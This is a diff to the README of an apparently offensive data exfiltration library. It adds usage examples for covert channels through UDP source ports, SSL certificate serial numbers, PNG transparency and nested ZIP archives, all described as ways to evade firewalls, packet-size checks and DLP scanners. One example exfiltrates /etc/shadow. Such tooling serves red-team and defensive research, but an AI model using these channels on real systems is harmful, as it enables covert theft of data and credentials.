@@ -510,6 +510,48 @@ check, output = a.send_string("hello")
 print(a.Decode(output))
 ```
 
+#### UDP Sport
+
+UDP source port uses the source-port byte to send out `int`s with no body. Hopefully evading packet size detection mechanisms. 
+
+```python
+
+# Server
+from pyexfil.network.UDP_SPort import Send
+
+key = "123456"
+ip_addr = "127.0.0.1"
+
+a = Send(key, ip_addr, dport=Send.REMOTE_UDP_PORT, wait_time=Send.DEFAULT_TIME_BETWEEN_PACKETS)
+a.Sender('Hello World!')
+
+# Client
+from pyexfil.network.UDP_SPort import Broker
+
+key = "123456"
+
+b = Broker(key, ip_addr="0.0.0.0", local_port=Broker.REMOTE_UDP_PORT)
+
+```
+
+#### Certificate Exchange
+This module is exploiting the SSL certificate exchange mechanism. When a new SSL connection is established, a certificate is exchanged. This module will convert data into the value of the serial number of a certificate and then use SSL connection establishement (handshake) as the means to transport the certificate. This is very useful for transmitting short messages in a covert manner. Most firewalls and proxies should enable SSL communication. 
+
+```python
+# Server
+from pyexfil.Comm.cert_exchange import Broker
+
+b = Broker(key="123456", server="127.0.0.1", port=8443)
+b.GetData()
+
+
+# Client
+from pyexfil.Comm.cert_exchange import Sender
+
+a = Sender(key="123456", server="127.0.0.1", port=8443)
+a.Send("Hello world")
+```
+
 ### Physical
 
 #### Audio
@@ -647,4 +689,34 @@ To decode simply use:
 from pyexfil.Stega import braille
 data = open("output.txt", 'r').read()
 braille.Decode(data)
+```
+
+#### PNG Transparency
+This little nifty module will take a PNG image file and embed the data you want to exfiltrate as the transparency bit (4th). It does mean that the image file needs to be big enough for large sets of data but for rapid-short-burst communication it can be very useful. 
+
+```python
+#!/usr/bin/env python3
+
+from pyexfil.Stega.png_transparency import Encode, Decode
+
+encodingWrapper = Encode(key="ABC123456", data="Secret Secret Data")
+encodingWrapper.Run()
+
+decodingWrapper = Decode(key="ABC123456", file_path='output.png')
+print(decodingWrapper.Run())
+``` 
+
+#### ZIP Loop
+This module is not specifically for steganography but was put here as it is the best fit. The idea is that many DLP scanners will not pass beyond the 1k iterations of decompressing ZIP files to avoid overhead. This uses a big random number of iterations resulting in a significantly larger output that should go unnoticed by some DLP mechanisms. 
+
+```python3
+
+from pyexfil.Stega.zipception import Broker, Sender
+
+a = Sender(folder_path="/etc/shadow", key=Sender.PYEXFIL_DEFAULT_PASSWORD, Sender.iterations=NUMBER_OF_ITERATIONS)
+a.Run()
+
+b = Broker("False.zip", key=Broker.PYEXFIL_DEFAULT_PASSWORD)
+b.Run()
+
 ```
